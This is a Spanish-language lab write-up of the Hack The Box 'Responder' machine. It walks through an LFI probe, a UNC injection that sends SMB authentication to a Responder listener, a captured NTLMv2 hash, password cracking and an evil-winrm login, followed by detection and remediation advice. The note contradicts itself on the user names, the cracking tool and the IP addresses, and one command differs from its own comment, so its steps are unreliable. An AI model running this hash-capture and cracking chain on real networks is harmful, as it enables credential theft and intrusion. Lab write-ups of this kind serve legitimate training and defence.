---
tags:
  - htb
  - starting-point
  - tier-1
  - easy
  - windows
  - llmnr
  - ntlmv2
  - en-progreso
ip:
os: Windows
difficulty: Easy
status: en-progreso
tiempo: 1h 0m
fecha_inicio: 2026-08-13
fecha_completada: —
puntos: 0
mitre_tactics:
  - Credential Access
mitre_techniques:
  - T1557.001
  - T1110.002
---
# 🖥️ Responder — Windows — Easy (Tier 1)

> [!info] Resumen
> **IP:** `10.129.73.245
` | **OS:** Windows | **Tier/Fase:** 1 | **Tiempo:** 1h 0m
> LLMNR/NBT-NS poisoning con Responder captura el hash NTLMv2 del usuario `wley` — se crackea offline con hashcat para obtener la contraseña.

---

## 1. Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 10.129.73.245 -oN nmap.txt
```

| Puerto   | Servicio  | Versión                     | Hallazgo clave                                           |
| -------- | --------- | --------------------------- | -------------------------------------------------------- |
| 80/TCP   | http      | Apache httpd 2.4.52         | Sin hallazgo por resultados de Nmap.                     |
| 5985/TCP | http      | Microsoft HTTPAPI httpd 2.0 | Sin hallazgo por resultados de Nmap.                     |
| 7680/tcp | pando-pub | -                           | Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows |

**→ Vector:** No hay explotación directa por puerto — el vector es de red (poisoning), no un servicio vulnerable clásico.

---

## 2. Explotación

> Vector principal: LLMNR/NBT-NS Poisoning — captura pasiva de hash NTLMv2 (Responder) + cracking offline (hashcat)

```bash
# Paso 1: insertar el dominio local de unika.htb a la ip destino para que reconozca el sitio web, si no no entrará.
echo "10.129.93.154 unika.htb" | sudo tee -a /etc/hosts

# Paso 2: Ver si el sitio web es vulnerable a LFI con la función include de php.
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

# Paso 3: Ya si es vulnerable, mostrará el h+osts de la víctima.  Posteriormente, lanzar Responder en la interfaz de la VPN de HTB.
sudo responder -I tun0

# Paso 4: Hay que lanzar una petición SMB, aunque falle el include(), el intento de SMB ya ocurrió antes del fallo y Responder ya lo capturó. (OJO acá es la IP del túnel, no de la máquina víctima, si no el responder no capturará la autenticación SMB).
http://unika.htb/?page=//10.129.93.154/whatever

#Paso 5: Hash capturado en:
echo "Administrator::RESPONDER:c4943cd1c7169e71:F92B50A59CF6E832C53D08E0B65C37B6:01010000000000008008975D4E32DD01360AB05996E5B0C90000000002000800510031003000510001001E00570049004E002D0031003300520046003100360031004A0037004100410004003400570049004E002D0031003300520046003100360031004A003700410041002E0051003100300051002E004C004F00430041004C000300140051003100300051002E004C004F00430041004C000500140051003100300051002E004C004F00430041004C00070008008008975D4E32DD0106000400020000000800300030000000000000000100000000200000E070049E3B0F4EE410B10F8EEE18110FA0E01A58B4BA61E16A84A31ACAD2181B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310033000000000000000000" > hash.txt

# Paso 6: crackear el hash con john. Nos dará usuario y contraseña si el crackero es exitoso.
jhon -w=/usr/share/wordlists/rockyou.txt hash.txt 

# Paso 7: Iniciar autenticación remota con WinRM / Evil-WinRM.
evil-winrm -i 10.129.93.154 -u administrador -p badminton

#paso 8: Navegar por los usuarios del sistema, se encontrará a mike, en el Desktop, estará el flag.txt
```

> [!success] Flag / Credencial obtenida
> Usuario: `mike` | Password: `ea81b7afddd03efaa0945333ed147fac`

---

## 3. Escalación de Privilegios

N/A — el objetivo de Tier 1 es obtener la contraseña en texto plano vía cracking, no post-explotación adicional.

---

## 4. MITRE ATT&CK

| Táctica            | Técnica                                    | ID        | Uso en esta máquina                                  |
| -------------------- | -------------------------------------------- | --------- | -------------------------------------------------------- |
| Credential Access    | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning | T1557.001 | Responder captura el hash NTLMv2 al responder falsamente a broadcasts de resolución de nombre |
| Credential Access    | Brute Force: Password Cracking              | T1110.002 | hashcat offline contra el hash capturado |

---

## 5. Detección & Remediación

**Blue Team detecta:**
- Respuestas LLMNR/NBT-NS desde un host que no es el DNS/WINS legítimo de la red (anómalo por diseño — ningún host normal debería responder estas consultas)
- Tráfico UDP 5355 (LLMNR) y 137 (NBT-NS) inusual entre estaciones de trabajo
- Autenticaciones NTLM hacia hosts fuera del dominio o inventario conocido

**Remediación:**
- Deshabilitar LLMNR (GPO: `Turn off Multicast Name Resolution`) y NBT-NS en adaptadores de red
- Si no se pueden deshabilitar por dependencias legacy: segmentar red, monitorear con IDS reglas específicas de Responder/poisoning
- Forzar SMB Signing para mitigar relay del hash capturado; políticas de contraseña fuertes para que el hash capturado no sea crackeable en tiempo razonable

---

## 6. Lecciones

Se aprendió que en un sitio web hay que probar local file inclusion y existe la función include, que permite inyectar el FI en el servidor. En busca de si la ruta de los archivos que adopta la función include está literalmente en los archivos del servidor, sin permiso previo, se podría explotar por ahí una autenticación SMB en la URL para corresponder, capturar la autenticación SMB y después craquear con John el hash del Ntlm. Así que se podrían obtener las credenciales, autenticar por el servicio de WinRM y obtener acceso remoto a la máquina víctima

**Bloqueado:**

| Fase | Causa                                                                                                                        | Fix                                                  |
| ---- | ---------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| 2    | El responder no capturaba el NTLM porque el ataque web al protocolo SMB la ip que le asignaba  era la de la máquina víctima. | Debe inyectarse después de ?page=//IP-TUNEL/whatever |


---

## 8. Conexiones

- Similar: `[[HTB/Sequel/Sequel]]` (credencial obtenida por medio indirecto, no exploit clásico)
- Siguiente nivel: máquinas de Fase 2 (Active Directory) — este es el primer contacto con captura de hash NTLM
- Técnica: `[[Técnicas/LLMNR-NBTNS-Poisoning]]`
- Teoría: [`Teoria_LLMNR_Responder`](obsidian://open?vault=RedTeamLab&file=HTB%2FResponder%2FTeoria_LLMNR_Responder.pdf)

**Referencias:** [HackTricks - LLMNR/NBT-NS Poisoning](https://book.hacktricks.xyz/windows-hardening/ad-information-in-windows/broadcast-llmnr-nbt-ns-mdns-spoofing) · [MITRE T1557.001](https://attack.mitre.org/techniques/T1557/001/)
